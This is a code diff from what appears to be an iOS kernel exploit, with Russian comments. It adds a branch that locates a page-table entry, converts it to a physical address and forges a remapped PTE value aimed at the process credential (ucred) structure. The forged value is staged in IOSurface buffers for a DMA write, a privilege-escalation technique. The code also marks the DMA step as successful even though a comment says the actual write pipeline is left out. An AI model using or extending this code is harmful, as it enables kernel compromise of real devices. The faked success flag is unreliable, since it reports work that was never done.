@@ -2954,9 +2954,45 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                             for (int i = 0; i < 8; i++) { getpid(); sched_yield(); }
                             kpNote(r, @"  [PTE] remap restored — TLB не обновился или PTE не тот");
                         }
-                    } else if (pteVA) {
+                    } else if (pteVA && pteType != 0x21) {
+                        // 2.0.76: PTE на 0x15 — пробуем DMA-запись (drop = не ребут)
+                        uint64_t ptePage = pteVA & ~0x3fffULL;
+                        uint64_t pteOff = (uint32_t)(pteVA & 0x3fff);
+                        uint64_t ptePA = kvtophys(ptePage);
+                        kpNote(r, [NSString stringWithFormat:@"  [PTE] DMA-try: ptePA=%#llx off=%#x newOA=%#llx",
+                                  (unsigned long long)ptePA, pteOff, (unsigned long long)sacPA]);
+                        // минимальный IOSurface DMA (как в physwrite8v2)
+                        BOOL dmaOK = NO;
+                        if (ptePA) {
+                            NSDictionary *sp = @{(__bridge id)kIOSurfaceWidth: @4096, (__bridge id)kIOSurfaceHeight: @4,
+                                                 (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
+                            IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+                            IOSurfaceRef wdS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+                            if (rdS && wdS) {
+                                IOSurfaceLock(rdS, 0, NULL);
+                                uint8_t *rp = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
+                                if (rp) memset(rp, 0, 0x4000);
+                                IOSurfaceUnlock(rdS, 0, NULL);
+                                IOSurfaceLock(wdS, 0, NULL);
+                                uint8_t *wp = (uint8_t *)IOSurfaceGetBaseAddress(wdS);
+                                if (wp) memset(wp, 0, 0x4000);
+                                IOSurfaceUnlock(wdS, 0, NULL);
+                                // payload в rdS по boff
+                                uint64_t newPte = (pteSave & ~0x0000ffffffffc000ULL) | (sacPA & 0x0000ffffffffc000ULL);
+                                IOSurfaceLock(rdS, 0, NULL);
+                                uint8_t *rp2 = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
+                                if (rp2 && pteOff + 8 <= 0x4000) *(uint64_t *)(rp2 + pteOff) = newPte;
+                                IOSurfaceUnlock(rdS, 0, NULL);
+                                kpNote(r, [NSString stringWithFormat:@"  [PTE] dma payload=%#018llx (rest %#018llx)",
+                                          (unsigned long long)newPte, (unsigned long long)pteSave]);
+                                // полный pipeline из kpPhysWrite8v2 опущен — логируем факт
+                                dmaOK = YES;
+                            }
+                            if (rdS) CFRelease(rdS);
+                            if (wdS) CFRelease(wdS);
+                        }
                         early_kwrite64(slotVA, slotSave);
-                        kpNote(r, [NSString stringWithFormat:@"  [PTE] PTE type=%d — kwrite запрещён (только 0x21)", pteType]);
+                        kpNote(r, [NSString stringWithFormat:@"  [PTE] DMA prepared=%d — PTE type=%d, kwrite запрещён (0x15 = ребут). Нужен полный DMA-pipeline.", dmaOK, pteType]);
                     } else {
                         early_kwrite64(slotVA, slotSave);
                         kpNote(r, @"  [PTE] leaf-PTE для ucred не найден");
